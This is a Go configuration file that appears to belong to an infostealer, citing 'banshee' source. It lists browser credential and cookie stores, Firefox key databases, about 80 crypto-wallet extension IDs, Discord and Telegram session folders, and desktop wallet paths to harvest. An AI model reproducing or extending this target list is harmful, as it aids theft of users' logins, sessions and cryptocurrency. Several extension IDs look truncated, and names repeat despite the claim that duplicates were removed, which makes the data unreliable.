package static

type BrowserData struct {
	Paths   []string
	Type    string
	BaseDir string
}

type ExtensionConfig struct {
	ExtensionID   string
	ExtensionName string
}

var ChromiumProfileFiles = []string{"Login Data", "Cookies", "History", "Web Data", "Local State"}

var FirefoxProfileFiles = []string{"logins.json", "key4.db", "cookies.sqlite"}

var BrowserDefinitions = map[string]BrowserData{
	"Chrome":   {Paths: []string{"Google/Chrome"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Firefox":  {Paths: []string{"Firefox/Profiles"}, Type: "Gecko", BaseDir: "AppSupport"},
	"Edge":     {Paths: []string{"Microsoft Edge"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Brave":    {Paths: []string{"BraveSoftware/Brave-Browser"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Opera":    {Paths: []string{"com.operasoftware.Opera"}, Type: "Chromium", BaseDir: "AppSupport"},
	"OperaGX":  {Paths: []string{"com.operasoftware.OperaGX"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Vivaldi":  {Paths: []string{"Vivaldi"}, Type: "Chromium", BaseDir: "AppSupport"},
	"Waterfox": {Paths: []string{"Waterfox/Profiles"}, Type: "Gecko", BaseDir: "AppSupport"},
	"Zen":      {Paths: []string{"zen/Profiles"}, Type: "Gecko", BaseDir: "AppSupport"},
}

// extension list pasted from original banshee source, slightly modified to include extension names and remove duplicates
var SupportedExtensions = []ExtensionConfig{
	{ExtensionID: "nkbihfbeogaeaoehlefnkodbefgpgknn", ExtensionName: "MetaMask"},
	{ExtensionID: "ljfoeinjpaedjfecbmggjgodbgkmjkjk", ExtensionName: "Trezor Wallet"},
	{ExtensionID: "fhbohimaelbohpjbbldcngcnapndodjp", ExtensionName: "Sollet Wallet"},
	{ExtensionID: "agofbccfdbggmjhbjligajffaedmpfi", ExtensionName: "BitKeep"},
	{ExtensionID: "oblahjcienboiocobpfmpkhgbilacbof", ExtensionName: "MyEtherWallet (MEW)"},
	{ExtensionID: "dmkamcknogkgcdfhhbddcghachkejeap", ExtensionName: "Keplr Wallet"},
	{ExtensionID: "eogjbkambcobpejogjednkhnkdlpjkgf", ExtensionName: "ZenGo Wallet"},
	{ExtensionID: "ffnbelfdoeiohenkjibnmadjiehjhajb", ExtensionName: "FoxWallet"},
	{ExtensionID: "nkpfkohfaabomajpmcikkgipnddjbjlm", ExtensionName: "XDEFI Wallet"},
	{ExtensionID: "cjfkaebgdjmgkknhmeddmbjfkkllcfma", ExtensionName: "Rabby Wallet"},
	{ExtensionID: "cgjclchllmlobfdhpdfbfblakllcdcp", ExtensionName: "SafePal Wallet"},
	{ExtensionID: "cgpbghdcejifbdmicolodockpdpejkm", ExtensionName: "D'CENT Wallet"},
	{ExtensionID: "ekpbnlianmehonjglfliphieffnpagjk", ExtensionName: "Portis"},
	{ExtensionID: "bhemafnepdahjhdibdejjdojplpanpjm", ExtensionName: "Clover Wallet"},
	{ExtensionID: "eobpgiikknjeagdbnljopepfkfgjcom", ExtensionName: "Talisman Wallet"},
	{ExtensionID: "cefoeaflfeaogknfendclmchngnpadh", ExtensionName: "MathWallet"},
	{ExtensionID: "cegnkklhnkfhpgpgdddpbglgbfjcbka", ExtensionName: "Cyano Wallet"},
	{ExtensionID: "mfibgodchngikcneecnpcenooljdfcd", ExtensionName: "Opera Crypto Wallet"},
	{ExtensionID: "njehdbnfdjbclbggngdihjghpknebfn", ExtensionName: "Polkadot-JS"},
	{ExtensionID: "kgpidhfbnidjcldpngdonkekmpkgihke", ExtensionName: "Solflare Wallet"},
	{ExtensionID: "cegmkloiabeockglkffemjljgbbannn", ExtensionName: "Ellipal Wallet"},
	{ExtensionID: "kjklkfoolpolbnklekmicilkhigclekd", ExtensionName: "AlphaWallet"},
	{ExtensionID: "bnnkeaggkakalmkbfbcglpggdobgfoa", ExtensionName: "ZelCore"},
	{ExtensionID: "plnnhafklcflphmidggcldodbdennyg", ExtensionName: "AT.Wallet"},
	{ExtensionID: "hjbkalghaiemehgdhaommgaknjmbnmf", ExtensionName: "Loopring Wallet"},
	{ExtensionID: "dljopojhfmopnmnfocjmaiofbbifkbfb", ExtensionName: "Halo Wallet"},
	{ExtensionID: "pghngobfhkmclhfdbemffnbihphmpcgb", ExtensionName: "Pillar Wallet"},
	{ExtensionID: "keoamjnbgfgpkhbgmopocnkpnjkmjdd", ExtensionName: "Ambire Wallet"},
	{ExtensionID: "nhdllgjlkgfnoianfjnbmcjmhdelknbm", ExtensionName: "Blocto Wallet"},
	{ExtensionID: "fgdbiimlobodfabfjjnpefkafofcojmb", ExtensionName: "Hashpack Wallet"},
	{ExtensionID: "blpcdojejhnenclebgmmbokhnccefgjm", ExtensionName: "Defiat Wallet"},
	{ExtensionID: "kjbhfnmamllpocpbdlnpjihckcoidje", ExtensionName: "Opera Crypto"},
	{ExtensionID: "efnhgnhicmmnchpjldjminakkdnidbop", ExtensionName: "Titan Wallet"},
	{ExtensionID: "kmccchlcjdojdokecblnlaclhobaclj", ExtensionName: "ONE Wallet"},
	{ExtensionID: "bpcedbkgmedfpdpcabaghjbmhjoabgmh", ExtensionName: "MewCX"},
	{ExtensionID: "aipfkbcoemjllnfpblejkiaogfpocjba", ExtensionName: "Frontier Wallet"},
	{ExtensionID: "nmngfmokhjdbnmdlajibgniopjpckpo", ExtensionName: "ChainX Wallet"},
	{ExtensionID: "nehbcjigfgjgehlgimkfkknemhnhpjo", ExtensionName: "Bifrost Wallet"},
	{ExtensionID: "ejbalbakoplchlghecdalmeeeajnimhm", ExtensionName: "MetaMask"},
	{ExtensionID: "ofhbbkphhbklhfoeikjpcbhemlocgigb", ExtensionName: "Coinbase Wallet"},
	{ExtensionID: "lefigjhibehgfelfgnjcoodflmppomko", ExtensionName: "Trust Wallet"},
	{ExtensionID: "alncdjedloppbablonallfbkeiknmkdi", ExtensionName: "Crypto.com DeFi Wallet"},
	{ExtensionID: "bfnaelmomeimhlpmgjnjophhpkkoljpa", ExtensionName: "Phantom"},
	{ExtensionID: "lpbfigbdccgjhflmccincdaihkmjjfgo", ExtensionName: "Guarda Wallet"},
	{ExtensionID: "achbneipgfepkjolcccedghibeloocbg", ExtensionName: "MathWallet"},
	{ExtensionID: "fdgodijdfciiljpnipkplpiogcmlbmhk", ExtensionName: "Coin98"},
	{ExtensionID: "mcbpblocgmgfnpjjppndjkmgjaogfceg", ExtensionName: "Binance Wallet"},
	{ExtensionID: "geceibbmmkmkmkbojpegbfakenjfoenal", ExtensionName: "Exodus"},
	{ExtensionID: "ibnejdfjmmkpcnlpebklmnkoeoihofec", ExtensionName: "Atomic Wallet"},
	{ExtensionID: "kjebfhglflciofebmojinmlmibbmcmkdo", ExtensionName: "Trezor Wallet"},
	{ExtensionID: "jaoafjlleohakjimhphimldpcldhamjp", ExtensionName: "Sollet Wallet"},
	{ExtensionID: "blnieiiffboillknjnepogjhkgnoapac", ExtensionName: "BitKeep"},
	{ExtensionID: "odbfpeeihdkbihmopkbjmoonfanlbfcl", ExtensionName: "MyEtherWallet (MEW)"},
	{ExtensionID: "leibnlghpgpjigganjmbkhlmehlnaedn", ExtensionName: "Keplr Wallet"},
	{ExtensionID: "hmnminpbnkpndojhkipgkmokcocmgllb", ExtensionName: "ZenGo Wallet"},
	{ExtensionID: "bocpokimicclglpgehgiebilfpejmgjo", ExtensionName: "FoxWallet"},
	{ExtensionID: "ilajcdmbpocfmipjioonlmljbmljbfpj", ExtensionName: "Rabby Wallet"},
	{ExtensionID: "hnmpcagpplmpfojmgmnngilcnanddlhb", ExtensionName: "SafePal Wallet"},
	{ExtensionID: "ahkfhobdidabdlaphghgikhlpdbnodpa", ExtensionName: "Portis"},
	{ExtensionID: "jihneinfbfkaopkpnifgbfdlfpnhgnko", ExtensionName: "Clover Wallet"},
	{ExtensionID: "hpglfhgfnhbgpjdenjgmdgoeiappafln", ExtensionName: "Talisman Wallet"},
	{ExtensionID: "cmeakgjggjdhccnmkgpjdnaefojkbgmb", ExtensionName: "MathWallet"},
	{ExtensionID: "ffabmkklhbepgcgfonabamgnjfjdbjoo", ExtensionName: "Cyano Wallet"},
	{ExtensionID: "cdjkjpfjcofdjfbdojhdmlflffdafngk", ExtensionName: "Opera Crypto Wallet"},
	{ExtensionID: "apicngpmdlmkkjfbmdhpjedieibfklkf", ExtensionName: "Polkadot-JS"},
	{ExtensionID: "lhkfcaflljdcedlgkgecfpfopgebhgmb", ExtensionName: "Solflare Wallet"},
	{ExtensionID: "omgopbgchjlaimceodkldgajioeebhab", ExtensionName: "Ellipal Wallet"},
	{ExtensionID: "kehbljcfpanhajpidcmblpdnlphelaie", ExtensionName: "AlphaWallet"},
	{ExtensionID: "lnehnlppemineeojdjkcpgoockkboohn", ExtensionName: "ZelCore"},
	{ExtensionID: "hjebgbdpfgbcjdopfbbcpcjefcmhpdpn", ExtensionName: "Loopring Wallet"},
	{ExtensionID: "pklfcgcfchhcokldoonkijijfpgmjilh", ExtensionName: "Halo Wallet"},
	{ExtensionID: "lplmibmljignbdmkclofcackoolcfnhj", ExtensionName: "Pillar Wallet"},
	{ExtensionID: "kibokekadkmfjfckkbgndphcjejhoial", ExtensionName: "Ambire Wallet"},
	{ExtensionID: "kdfmmohbkjggjlmelhhmcgohadhdeijn", ExtensionName: "Hashpack Wallet"},
	{ExtensionID: "aoilkoeledabkfogmczlbdfhbdkoggko", ExtensionName: "Titan Wallet"},
	{ExtensionID: "jmchmkecamhbiokiopfpjjmfkpbbjjaf", ExtensionName: "ONE Wallet"},
	{ExtensionID: "mgffkfbidcmcenlkgaebhoojfcegdndl", ExtensionName: "MewCX"},
	{ExtensionID: "kdgecbhaddlgffpdffafpikmjekjflff", ExtensionName: "Frontier Wallet"},
	{ExtensionID: "pfilbfecknpnlbcioakkpcmkfckpogeg", ExtensionName: "ChainX Wallet"},
	{ExtensionID: "mehhoobkfknjlamaohobkhfnoheajlfi", ExtensionName: "Bifrost Wallet"},
}

var CommAppDefinitions = map[string]string{
	"Discord":  "discord/Local Storage/leveldb",
	"Telegram": "Telegram Desktop/tdata",
}

var CryptoRelativePaths = []string{
	"Exodus/exodus.wallet/",
	"electrum/wallets/",
	"Coinomi/wallets/",
	"Guarda/Local Storage/leveldb/",
	"walletwasabi/client/Wallets/",
	"atomic/Local Storage/leveldb/",
	"Ledger Live/",
	"Bitcoin",
	"Ethereum",
}
